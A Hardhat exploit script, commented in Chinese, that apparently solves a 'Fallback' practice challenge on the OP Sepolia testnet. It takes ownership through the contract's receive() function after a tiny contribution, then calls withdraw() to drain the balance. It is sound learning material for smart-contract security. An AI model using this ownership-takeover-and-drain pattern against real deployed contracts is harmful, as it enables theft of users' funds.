import hre from "hardhat";
// require("dotenv").config();
// import { config as dotenvConfig } from "dotenv";
// 調用 dotenv 的 config 方法來加載環境變量
// dotenvConfig();

// 這是公用的測試網路，因此會限制一些功能，例如不能直接發送以太幣到合約地址，故放棄這寫法
// const url = "https://sepolia.optimism.io"; 
// const url = process.env.OP_SEPOLIA_RPC_URL_API_KEY;
// const web3 = new Web3(url);
// console.log('使用 Web3.js 已連接到 OP Sepolia 測試網！');

// Fallback 地址
const contractAddress = "0x7451Ec6AeFaF19D9766c4d45d66275CD87755297"; 
console.log("目標 Fallback 合約地址:", contractAddress);

// 我這個駭客的帳戶地址
const myAccount = "0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6"
console.log("我的帳戶地址: ", myAccount);

// 獲取 signer（帳戶）
const [signer] = await hre.ethers.getSigners();
console.log("我的帳戶地址 by hre: ", signer.address);

// 合約 ABI
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "contribute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "contributions",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getContribution",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// 使用 web3.js 創建合約實例
// const fallback = new web3.eth.Contract(contractABI, contractAddress);

// 使用 hardhat ether.js 創建合約實例
const fallback = new hre.ethers.Contract(contractAddress, contractABI, signer);


async function sendEtherToContribute() {
  // 發送交易，注意這裡最多只能發送小於 0.001 ether，合約規定的，否則會被退款
  // 然而經過 getContribution() 調查 owner 的貢獻值，竟然高達 1000 ether！
  // 所以從這個函數去改寫 owner 地址為我的地址，是不可能的 QQ
  // 僅能從 sendEtherDirectly() 函數去觸發合約 Fallback 的 receive() 改寫 owner 地址為我的地址
  // 使用 hre 創建合約實例，並發送交易
  const tx = await fallback.contribute({
    value: hre.ethers.parseEther("0.0001"), // 發送 0.0001 ether，若高於 0.001 ether 會被退款
  });
  await tx.wait(); // 等待交易確認
  console.log("交易成功，交易哈希:", tx.hash);
  // 到這裡應該會成功更新 contributions[myAccount] 
}


async function sendEtherDirectly() {
  // 直接發送以太幣到合約地址
  // 注意，一定要先執行  sendEtherToContribute() 去更新 contributions[myAccount]，否則會被拒絕退款
  // 使用 hre 創建合約實例，並發送交易
  const amountToSend = hre.ethers.parseEther("0.0001"); // 發送 0.0001 ether
  const tx = await signer.sendTransaction({
    to: contractAddress,
    value: amountToSend,
  });
  // 等待交易確認
  console.log("交易發送中，交易哈希:", tx.hash);
  const receipt = await tx.wait();
  console.log("交易確認，區塊號:", receipt.blockNumber);
}

async function main() {  
  /*
  // ================================================ 這段示範為非ABI導入創建的實例
  // 使用 hre 取得工廠實例
  const Fallback_hre = await hre.ethers.getContractFactory("Fallback");
  // 連接到已部署的合約
  const fallback_hre = await Fallback_hre.attach(contractAddress);
  // 呼叫 owner 變數
  const owner = await fallback_hre.owner();
  console.log("Contract owner:", owner);
  // 0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f
  // ================================================
  */
  // 查詢合約 owner
  const owner = await fallback.owner();
  console.log("Contract owner:", owner);

  /*
  // 呼叫 getContribution() 函數，查詢 owner 貢獻，web3 版本
  const contribution_owner = await fallback.methods.getContribution().call({
    from: owner
  });
  console.log("Owner 的貢獻:", web3.utils.fromWei(contribution_owner, "ether"), "ether");
  console.log("Owner 的貢獻:", contribution_owner, "wei");
  */
  
  
  //呼叫 getContribution() 函數，查詢 owner 貢獻，hre 版本
  const ownerContribution = await fallback.contributions(owner)
  console.log("Owner 的貢獻:", hre.ethers.formatEther(ownerContribution), "ether");
  console.log("Owner 的貢獻:", ownerContribution, "wei");

  // 調查餘額
  const contractBalance = await hre.ethers.provider.getBalance(contractAddress);
  console.log("合約地址的以太幣餘額:", hre.ethers.formatEther(contractBalance), "ETH");
  console.log("合約地址的以太幣餘額 (Wei):", contractBalance.toString())
  

  /*
  // 呼叫 getContribution() 函數，查詢 我的 貢獻，web3 版本
  const contribution_myAccount = await fallback.methods.getContribution().call({
    from: myAccount
  });
  console.log("我的貢獻:", web3.utils.fromWei(contribution_myAccount, "ether"), "ether");
  console.log("我的貢獻:", contribution_myAccount, "wei");
  */

  
  //呼叫 getContribution() 函數，查詢 我的 貢獻，hre 版本
  const myContribution = await fallback.getContribution();
  console.log("我的貢獻:", hre.ethers.formatEther(myContribution), "ether");
  console.log("我的貢獻:", myContribution, "wei");
  
  
  // 呼叫 contribute() 函數，貢獻 0.0001 ether
  await sendEtherToContribute();
  console.log("執行 sendEtherToContribute()，貢獻 0.0001 ether");

  // 再次呼叫 getContribution() 函數，查詢 我的 貢獻是否更新
  const myContribution2 = await fallback.getContribution();
  console.log("更新我的貢獻:", hre.ethers.formatEther(myContribution2), "ether");
  console.log("更新我的貢獻:", myContribution2, "wei");

  // 直接發送以太幣到合約，觸發 receive()，之後變更 owner 為我的地址
  await sendEtherDirectly();
  console.log("執行 sendEtherDirectly()，貢獻 0.0001 ether");

  // 查詢合約 owner
  const owner2 = await fallback.owner();
  console.log("攻破後，更新 Contract owner:", owner2);
  // 已被變更為我的地址

  // 再次呼叫 getContribution() 函數，查詢 我的 貢獻是否更新
  const myContribution3 = await fallback.getContribution();
  console.log("攻破後，更新我的貢獻:", hre.ethers.formatEther(myContribution3), "ether");
  console.log("攻破後，更新我的貢獻:", myContribution3, "wei");
  console.log("執行 sendEtherDirectly()，不會更新貢獻映射");

  // 再次調查餘額
  const contractBalance2 = await hre.ethers.provider.getBalance(contractAddress);
  console.log("合約地址的以太幣餘額:", hre.ethers.formatEther(contractBalance2), "ETH");
  console.log("合約地址的以太幣餘額 (Wei):", contractBalance2.toString());

  // 攻破，領錢跑路
  await fallback.withdraw();
  console.log("提款成功");

  // 再次調查餘額
  const contractBalance3 = await hre.ethers.provider.getBalance(contractAddress);
  console.log("合約地址的以太幣餘額:", hre.ethers.formatEther(contractBalance3), "ETH");
  console.log("合約地址的以太幣餘額 (Wei):", contractBalance3.toString());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
